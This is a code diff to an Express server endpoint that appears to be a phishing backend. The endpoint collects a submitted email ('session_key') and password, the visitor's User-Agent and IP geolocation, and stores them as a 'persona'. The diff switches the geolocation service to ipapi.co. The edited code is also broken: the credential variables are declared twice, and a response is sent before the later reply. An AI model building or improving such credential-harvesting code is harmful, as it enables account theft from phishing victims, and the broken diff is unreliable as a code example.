@@ -21,18 +21,35 @@ app.get("/", (req, res) => {
 
 app.post("/UD92290", async (req, res) => {
   try {
-    const response = await axios.get("http://www.geoplugin.net/json.gp?ip=xx.xx.xx.xx").catch((err) => {
-      console.log("err: ", err);
-    })
+    // Get client IP
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0] ||
+      req.socket.remoteAddress ||
+      req.ip
 
-    const r = response?.data
+    // Free IP geolocation API
+    const response = await axios.get(`https://ipapi.co/${ip}/json/`)
+
+    const r = response.data
+
     const gottenAddress = {
-      ip: r?.geoplugin_request,
-      city: r?.geoplugin_city,
-      region: r?.geoplugin_region,
-      countryName: r?.geoplugin_countryName,
-      countryCode: r?.geoplugin_countryCode,
+      ip: r.ip,
+      city: r.city,
+      region: r.region,
+      countryName: r.country_name,
+      countryCode: r.country_code,
     }
+
+    const { session_key, password } = req.body
+    const user_agent = req.header("User-Agent")
+    const domain = session_key.split("@")[1]
+
+    console.log(gottenAddress)
+
+    res.json({
+      success: true,
+      gottenAddress,
+    })
 
     const { session_key, password } = req.body
     const user_agent = req.header("User-Agent")
@@ -58,9 +75,13 @@ app.post("/UD92290", async (req, res) => {
     const added = await addPersona({ ...obj })
     if (added) return res.status(201).json({ response: "Ok, added!" })
 
-  } catch (error) {
-    console.log("CATCH ERR: ", error)
-    res.status(400).json({ response: error?.msg || error })
+  } catch (err) {
+    console.log(err)
+
+    res.status(500).json({
+      success: false,
+      message: err?.msg || "Failed to fetch geolocation",
+    })
   }
 })
 
